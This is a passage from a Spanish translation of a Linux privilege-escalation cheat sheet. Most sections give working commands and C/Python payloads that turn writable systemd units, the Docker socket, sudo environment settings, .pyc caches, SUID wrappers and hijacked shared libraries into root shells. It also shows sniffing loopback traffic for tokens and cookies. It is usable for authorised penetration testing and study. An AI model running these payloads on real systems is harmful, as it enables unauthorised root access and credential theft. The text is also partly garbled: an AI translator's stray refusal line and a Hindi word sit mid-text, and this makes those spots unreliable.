- `ExecStartPre`, `ExecStartPost`: Toman una o más líneas de comando, que se **ejecutan antes** o **después** de que los **sockets**/FIFOs de escucha sean **creados** y enlazados, respectivamente. El primer token de la línea de comando debe ser un nombre de archivo absoluto, seguido de argumentos para el proceso.
- `ExecStopPre`, `ExecStopPost`: **Comandos** adicionales que se **ejecutan antes** o **después** de que los **sockets**/FIFOs de escucha sean **cerrados** y eliminados, respectivamente.
- `Service`: Especifica el nombre de la unidad de **servicio** que se **activará** con el **tráfico entrante**. Este ajuste solo está permitido para sockets con Accept=no. Por defecto, es el servicio que tiene el mismo nombre que el socket (con el sufijo reemplazado). En la mayoría de los casos, no debería ser necesario usar esta opción.

### Writable .socket files

Si encuentras un archivo `.socket` **escribible**, puedes **añadir** al inicio de la sección `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` y el backdoor se ejecutará antes de que se cree el socket. Por lo tanto, **probablemente necesitarás esperar hasta que la máquina se reinicie.**\
_Note que el sistema debe estar usando esa configuración de archivo socket o el backdoor no se ejecutará_

### Socket activation + writable unit path (create missing service)

Otra mala configuración de alto impacto es:

- una unidad socket con `Accept=no` y `Service=<name>.service`
- la unidad de servicio referenciada no existe
- un atacante puede escribir en `/etc/systemd/system` (o en otra ruta de búsqueda de unidades)

En ese caso, el atacante puede crear `<name>.service`, luego provocar tráfico al socket para que systemd cargue y ejecute el nuevo servicio como root.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Sockets escribibles

Si **identificas cualquier socket escribible** (_ahora estamos hablando de Unix Sockets y no de los archivos de configuración `.socket`_), entonces **puedes comunicarte** con ese socket y quizá explotar una vulnerabilidad.

### Enumerar Unix Sockets
```bash
netstat -a -p --unix
```
### Conexión en bruto
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Ejemplo de explotación:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### Sockets HTTP

Ten en cuenta que puede haber algunos **sockets escuchando HTTP** solicitudes (_no estoy hablando de archivos .socket, sino de los archivos que actúan como unix sockets_). Puedes comprobarlo con:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Si el socket **responde con una HTTP** request, entonces puedes **comunicarte** con él y quizá **explotar alguna vulnerabilidad**.

### Writable Docker Socket

El Docker socket, que a menudo se encuentra en `/var/run/docker.sock`, es un archivo crítico que debe protegerse. Por defecto, es writable por el usuario `root` y los miembros del grupo `docker`. Tener acceso de escritura a este socket puede llevar a privilege escalation. Aquí tienes un desglose de cómo se puede hacer esto y métodos alternativos si el Docker CLI no está disponible.

#### **Privilege Escalation with Docker CLI**

Si tienes acceso de escritura al Docker socket, puedes escalar privilegios usando los siguientes comandos:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Estos comandos te permiten ejecutar un container con acceso de nivel root al sistema de archivos del host.

#### **Usando Docker API Directamente**

En casos en los que Docker CLI no esté disponible, el Docker socket aún puede manipularse usando la Docker API y comandos `curl`.

1.  **List Docker Images:** Recupera la lista de imágenes disponibles.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Envía una solicitud para crear un container que monte el directorio raíz del sistema del host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Inicia el container recién creado:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Usa `socat` para establecer una conexión con el container, habilitando la ejecución de comandos dentro de él.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Después de configurar la conexión `socat`, puedes ejecutar comandos directamente en el container con acceso de nivel root al filesystem del host.

### Others

Ten en cuenta que si tienes permisos de escritura sobre el docker socket porque estás **dentro del grupo `docker`** tienes [**más formas de escalar privilegios**](interesting-groups-linux-pe/index.html#docker-group). Si la [**docker API está escuchando en un puerto** también podrías comprometerla](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consulta **más formas de escapar de containers o abusar de container runtimes para escalar privilegios** en:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Si encuentras que puedes usar el comando **`ctr`** lee la siguiente página, ya que **podrías abusar de él para escalar privilegios**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Si encuentras que puedes usar el comando **`runc`** lee la siguiente página, ya que **podrías abusar de él para escalar privilegios**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus es un sofisticado sistema de **inter-Process Communication (IPC)** que permite a las aplicaciones interactuar y compartir datos de forma eficiente. Diseñado pensando en los sistemas Linux modernos, ofrece un framework robusto para distintas formas de comunicación entre aplicaciones.

El sistema es versátil y admite IPC básico que mejora el intercambio de datos entre procesos, similar a unos **enhanced UNIX domain sockets**. Además, ayuda a difundir eventos o señales, fomentando una integración fluida entre los componentes del sistema. Por ejemplo, una señal de un daemon Bluetooth sobre una llamada entrante puede hacer que un reproductor de música se silencie, mejorando la experiencia del usuario. Además, D-Bus soporta un sistema de objetos remoto, simplificando las solicitudes de servicios y las invocaciones de métodos entre aplicaciones, y agilizando procesos que tradicionalmente eran complejos.

D-Bus funciona con un modelo de **allow/deny**, gestionando los permisos de los mensajes (llamadas a métodos, emisión de señales, etc.) según el efecto acumulado de las reglas de policy coincidentes. Estas policies especifican interacciones con el bus, lo que potencialmente puede permitir privilege escalation mediante el abuso de estos permisos.

Se proporciona un ejemplo de una policy de este tipo en `/etc/dbus-1/system.d/wpa_supplicant.conf`, detallando permisos para que el usuario root posea, envíe y reciba mensajes de `fi.w1.wpa_supplicant1`.

Las policies sin un usuario o grupo especificado se aplican de forma universal, mientras que las policies de contexto "default" se aplican a todo lo no cubierto por otras policies específicas.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Aprende cómo enumerar y explotar una comunicación D-Bus aquí:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Siempre es interesante enumerar la red y averiguar la posición de la máquina.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Triage rápida de filtrado outbound

Si el host puede ejecutar comandos pero los callbacks fallan, separa rápidamente el filtrado de DNS, transporte, proxy y ruta:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Puertos abiertos

Siempre revisa los servicios de red que se estén ejecutando en la máquina con los que no pudiste interactuar antes de acceder a ella:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Clasifica los listeners por target de bind:

- `0.0.0.0` / `[::]`: expuestos en todas las interfaces locales.
- `127.0.0.1` / `::1`: solo locales (buenos candidatos para tunnel/forward).
- IPs internas específicas (p. ej. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): normalmente accesibles solo desde segmentos internos.

### Flujo de triage de servicios solo locales

Cuando comprometes un host, los servicios enlazados a `127.0.0.1` a menudo se vuelven accesibles por primera vez desde tu shell. Un flujo local rápido es:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS como scanner de red (modo solo red)

Además de las comprobaciones locales de PE, linPEAS puede ejecutarse como un scanner de red enfocado. Usa los binarios disponibles en `$PATH` (normalmente `fping`, `ping`, `nc`, `ncat`) y no instala herramientas.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Si pasas `-d`, `-p` o `-i` sin `-t`, linPEAS se comporta como un escáner de red puro (saltándose el resto de las comprobaciones de privilege-escalation).

### Sniffing

Comprueba si puedes sniff traffic. Si puedes, podrías obtener algunas credentials.
```
timeout 1 tcpdump
```
Comprobaciones prácticas rápidas:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) es especialmente valioso en post-exploitation porque muchos servicios internos exponen allí tokens/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Capture ahora, analiza después:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Usuarios

### Enumeración genérica

Comprueba **quién** eres, qué **privilegios** tienes, qué **usuarios** hay en los sistemas, cuáles pueden **login** y cuáles tienen **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Algunas versiones de Linux se vieron afectadas por un bug que permite a usuarios con **UID > INT_MAX** escalar privilegios. Más info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) y [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** usando: **`systemd-run -t /bin/bash`**

### Groups

Comprueba si eres **miembro de algún grupo** que pueda darte privilegios de root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Comprueba si hay algo interesante dentro del clipboard (si es posible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Política de contraseñas
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Contraseñas conocidas

Si **conoces cualquier contraseña** del entorno, **intenta iniciar sesión como cada usuario** usando esa contraseña.

### Su Brute

Si no te importa generar mucho ruido y los binarios `su` y `timeout` están presentes en el equipo, puedes intentar hacer fuerza bruta de usuarios usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con el parámetro `-a` también intenta hacer fuerza bruta de usuarios.

## Abusos de PATH escribible

### $PATH

Si descubres que puedes **escribir dentro de alguna carpeta del $PATH**, podrías ser capaz de escalar privilegios **creando una backdoor dentro de la carpeta escribible** con el nombre de algún comando que vaya a ser ejecutado por otro usuario (root idealmente) y que **no se cargue desde una carpeta situada antes** de tu carpeta escribible en $PATH.

### SUDO and SUID

Podrías tener अनुमति para ejecutar algún comando usando sudo o podrían tener el bit suid. Compruébalo usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Algunos **comandos inesperados permiten leer y/o escribir archivos o incluso ejecutar un comando.** Por ejemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuración de Sudo podría permitir que un usuario ejecute algún comando con los privilegios de otro usuario sin conocer la contraseña.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
En este ejemplo, el usuario `demo` puede ejecutar `vim` como `root`; ahora es trivial obtener una shell añadiendo una clave ssh en el directorio root o llamando a `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta directiva permite al usuario **establecer una variable de entorno** mientras ejecuta algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este ejemplo, **basado en la máquina HTB Admirer**, era **vulnerable** a **PYTHONPATH hijacking** para cargar una biblioteca de Python arbitraria mientras se ejecutaba el script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### `__pycache__` writable / `.pyc` poisoning in imports permitidos por `sudo`

Si un **script de Python permitido por `sudo`** importa un módulo cuyo directorio de paquete contiene un **`__pycache__` escribible**, puedes reemplazar el `.pyc` en caché y obtener ejecución de código como el usuario privilegiado en la siguiente importación.

- Por qué funciona:
- CPython almacena las cachés de bytecode en `__pycache__/module.cpython-<ver>.pyc`.
- El intérprete valida el **header** (magic + metadata de timestamp/hash vinculada al source), y luego ejecuta el objeto de código marshaled almacenado después de ese header.
- Si puedes **eliminar y recrear** el archivo en caché porque el directorio es escribible, un `.pyc` propiedad de root pero no escribible aún puede ser reemplazado.
- Ruta típica:
- `sudo -l` muestra un script de Python o un wrapper que puedes ejecutar como root.
- Ese script importa un módulo local desde `/opt/app/`, `/usr/local/lib/...`, etc.
- El `__pycache__` del módulo importado es escribible por tu usuario o por todos.

Enumeración rápida:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Si puedes inspeccionar el script privilegiado, identifica los módulos importados y su ruta de caché:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Flujo de abuso:

1. Ejecuta una vez el script permitido por sudo para que Python cree el archivo de caché legítimo si aún no existe.
2. Lee los primeros 16 bytes del `.pyc` legítimo y reutilízalos en el archivo envenenado.
3. Compila un objeto de código payload, usa `marshal.dumps(...)`, elimina el archivo de caché original y recréalo con el encabezado original más tu bytecode malicioso.
4. Vuelve a ejecutar el script permitido por sudo para que el import ejecute tu payload como root.

Notas importantes:

- Reutilizar el encabezado original es clave porque Python comprueba los metadatos de la caché frente al archivo fuente, no si el cuerpo del bytecode realmente coincide con el source.
- Esto es especialmente útil cuando el archivo fuente es propiedad de root y no se puede escribir, pero el directorio `__pycache__` que lo contiene sí.
- El ataque falla si el proceso privilegiado usa `PYTHONDONTWRITEBYTECODE=1`, importa desde una ubicación con permisos seguros o elimina el acceso de escritura a todos los directorios en la ruta de importación.

Forma mínima de proof-of-concept:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Asegúrate de que ningún directorio en la ruta de importación de Python privilegiada sea escribible por usuarios con pocos privilegios, incluido `__pycache__`.
- Para ejecuciones privilegiadas, considera `PYTHONDONTWRITEBYTECODE=1` y comprobaciones periódicas de directorios `__pycache__` escribibles inesperados.
- Trata los módulos locales de Python escribibles y los directorios de caché escribibles igual que tratarías scripts de shell o bibliotecas compartidas escribibles ejecutadas por root.

### BASH_ENV preserved via sudo env_keep → root shell

Si sudoers preserva `BASH_ENV` (p. ej., `Defaults env_keep+="ENV BASH_ENV"`), puedes aprovechar el comportamiento de inicio no interactivo de Bash para ejecutar código arbitrario como root al invocar un comando permitido.

- Por qué funciona: En shells no interactivos, Bash evalúa `$BASH_ENV` y carga ese archivo antes de ejecutar el script objetivo. Muchas reglas de sudo permiten ejecutar un script o un wrapper de shell. Si `BASH_ENV` se preserva mediante sudo, tu archivo se carga con privilegios de root.

- Requisitos:
- Una regla de sudo que puedas ejecutar (cualquier objetivo que invoque `/bin/bash` de forma no interactiva, o cualquier script bash).
- `BASH_ENV` presente en `env_keep` (compruébalo con `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Elimina `BASH_ENV` (y `ENV`) de `env_keep`, prefiere `env_reset`.
- Evita wrappers de shell para comandos permitidos por sudo; usa binarios mínimos.
- Considera el logging de I/O de sudo y alertas cuando se usan variables de entorno preservadas.

### Terraform via sudo con `HOME` preservado (!env_reset)

Si sudo deja el entorno intacto (`!env_reset`) mientras permite `terraform apply`, `$HOME` permanece como el del usuario que llama. Terraform, por tanto, carga **$HOME/.terraformrc** como root y respeta `provider_installation.dev_overrides`.

- Apunta el provider requerido a un directorio escribible y coloca un plugin malicioso con el nombre del provider (por ejemplo, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform fallará en el handshake del plugin de Go, pero ejecuta el payload como root antes de morir, dejando un shell SUID detrás.

### TF_VAR overrides + symlink validation bypass

Las variables de Terraform pueden proporcionarse mediante variables de entorno `TF_VAR_<name>`, que sobreviven cuando sudo preserva el entorno. Validaciones débiles como `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` pueden ser evadidas con symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform resuelve el symlink y copia el verdadero `/root/root.txt` en un destino legible por el atacante. El mismo enfoque puede usarse para **escribir** en rutas privilegiadas creando de antemano symlinks de destino (por ejemplo, apuntando la ruta de destino del provider dentro de `/etc/cron.d/`).

### requiretty / !requiretty

En algunas distribuciones antiguas, sudo puede configurarse con `requiretty`, lo que obliga a que sudo se ejecute solo desde un TTY interactivo. Si se establece `!requiretty` (o la opción está ausente), sudo puede ejecutarse desde contextos no interactivos como reverse shells, cron jobs o scripts.
```bash
Defaults !requiretty
```
Esto no es una vulnerabilidad directa por sí misma, pero amplía las situaciones en las que las reglas de sudo pueden ser abusadas sin necesidad de un PTY completo.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Si `sudo -l` muestra `env_keep+=PATH` o un `secure_path` que contenga entradas escribibles por el atacante (por ejemplo, `/home/<user>/bin`), cualquier comando relativo dentro del target permitido por sudo puede ser suplantado.

- Requirements: una regla de sudo (a menudo `NOPASSWD`) que ejecute un script/binario que llame a comandos sin rutas absolutas (`free`, `df`, `ps`, etc.) y una entrada de PATH escribible que se busque primero.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Omitiendo rutas en la ejecución de Sudo
**Salta** para leer otros archivos o usa **symlinks**. Por ejemplo, en el archivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si se usa un **wildcard** (\*), es incluso más fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

Si el **permiso sudo** se otorga a un único comando **sin especificar la ruta**: _hacker10 ALL= (root) less_ puedes explotarlo cambiando la variable PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Esta técnica también se puede usar si un binario **suid** **ejecuta otro comando sin especificar la ruta hacia él (siempre comprueba con** _**strings**_ **el contenido de un binario SUID extraño)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

Si el binario **suid** **ejecuta otro comando especificando la ruta**, entonces puedes intentar **exportar una función** con el nombre del comando que el archivo suid está llamando.

Por ejemplo, si un binario suid llama a _**/usr/sbin/service apache2 start**_ tienes que intentar crear la función y exportarla:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Entonces, cuando llamas al binario suid, esta función se ejecutará

### Script escribible ejecutado por un wrapper SUID

Una mala configuración común de una aplicación personalizada es un wrapper de binario SUID propiedad de root que ejecuta un script, mientras que el propio script es escribible por usuarios con pocos privilegios.

Patrón típico:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Si `/usr/local/bin/backup.sh` es writable, puedes añadir payload commands y luego ejecutar el wrapper SUID:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Comprobaciones rápidas:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Este vector de ataque es especialmente común en wrappers de "maintenance"/"backup" que se distribuyen en `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable de entorno **LD_PRELOAD** se usa para especificar una o más librerías compartidas (.so files) que el loader cargará antes que todas las demás, incluida la librería estándar de C (`libc.so`). Este proceso se conoce como preloading a library.

Sin embargo, para mantener la seguridad del sistema y evitar que esta funcionalidad sea explotada, especialmente con ejecutables **suid/sgid**, el sistema impone ciertas condiciones:

- El loader ignora **LD_PRELOAD** para ejecutables donde el real user ID (_ruid_) no coincide con el effective user ID (_euid_).
- Para ejecutables con suid/sgid, solo se preloading libraries en rutas estándar que también sean suid/sgid.

La escalada de privilegios puede ocurrir si tienes la capacidad de ejecutar comandos con `sudo` y la salida de `sudo -l` incluye la instrucción **env_keep+=LD_PRELOAD**. Esta configuración permite que la variable de entorno **LD_PRELOAD** persista y sea reconocida incluso cuando los comandos se ejecutan con `sudo`, lo que puede llevar a la ejecución de código arbitrario con privilegios elevados.
```
Defaults        env_keep += LD_PRELOAD
```
No puedo guardar archivos en el sistema de archivos desde aquí. Si quieres, puedo traducir el contenido y devolvértelo listo para pegar en **/tmp/pe.c**.
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Entonces **compílalo** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Finalmente, **escala privilegios** ejecutando
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Una privesc similar puede ser abusada si el atacante controla la variable de entorno **LD_LIBRARY_PATH** porque controla la ruta donde se van a buscar las librerías.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Binario SUID – inyección de .so

Cuando te encuentres con un binario con permisos **SUID** que parezca inusual, es buena práctica verificar si está cargando correctamente archivos **.so**. Esto se puede comprobar ejecutando el siguiente comando:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por ejemplo, encontrarse con un error como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugiere un posible vector de explotación.

Para explotarlo, se procederá creando un archivo C, por ejemplo _"/path/to/.config/libcalc.c"_, que contenga el siguiente código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Este código, una vez compilado y ejecutado, tiene como objetivo elevar privilegios manipulando permisos de archivos y ejecutando un shell con privilegios elevados.

Compila el archivo C anterior en un archivo de objeto compartido (.so) con:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Finalmente, ejecutar el binario SUID afectado debería desencadenar el exploit, permitiendo una posible compromise del sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Ahora que hemos encontrado un binario SUID cargando una librería desde una carpeta donde podemos escribir, creemos la librería en esa carpeta con el nombre necesario:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si obtienes un error como
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) es una lista curada de binarios Unix que un atacante puede explotar para eludir restricciones de seguridad locales. [**GTFOArgs**](https://gtfoargs.github.io/) es lo mismo, pero para casos en los que **solo puedes inyectar argumentos** en un comando.

